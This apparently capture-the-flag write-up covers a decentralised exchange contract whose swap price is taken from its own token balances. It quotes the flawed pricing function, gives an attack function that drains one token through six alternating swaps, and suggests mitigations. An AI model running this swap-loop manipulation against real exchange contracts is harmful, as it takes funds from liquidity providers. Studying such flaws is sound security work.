# Intended functioning of Dex contract
Dex is a decentralised exchange contract. There are two tokens and the player starts here with 10 amount of each token. The liquidity pool i.e the dex contract itself holds 100 of each token. The contract allows users to swap in between tokens and uses liquidity pool to do so. 

# Vulnerability
The contract has a flawed logic for the `getSwapPrice` function as 
```javascript
  function getSwapPrice(address from, address to, uint256 amount) public view returns (uint256) {
        return ((amount * IERC20(to).balanceOf(address(this))) / IERC20(from).balanceOf(address(this)));
    }
```
This logic is vulnerable to Price manipulation attacks as the swap price depends on the liquidity pool token amounts. Upon swapping the whole balance of token from one to other, the math works out and we end with more than we started with and by continously doing it we are able to drain the pool out of one of the tokens:
```javascript
function attackContract() public {
        target.approve(address(target), 1000); //approving this contract address to do token exhanges 
        address t1 = target.token1();
        address t2 = target.token2();

        target.swap(t1, t2, 10);
        target.swap(t2, t1, 20);
        target.swap(t1, t2, 24);
        target.swap(t2, t1, 30);
        target.swap(t1, t2, 41);
        target.swap(t2, t1, 45);

    }
```

# Mitigation
A production version of this Dex would need several fixes working together. It should never let the calculated swap amount exceed the actual token balance the Dex is holding, and it should incorporate deeper liquidity pools so that any single trade represents a small fraction of total volume rather than being able to swing the price so drastically. It should also consider using time weighted average prices or an external oracle rather than deriving price entirely from the two token balances at the moment of the trade, since that alone makes manipulation trivial for anyone with enough capital or, as shown here, enough patience to round trip small amounts repeatedly.


















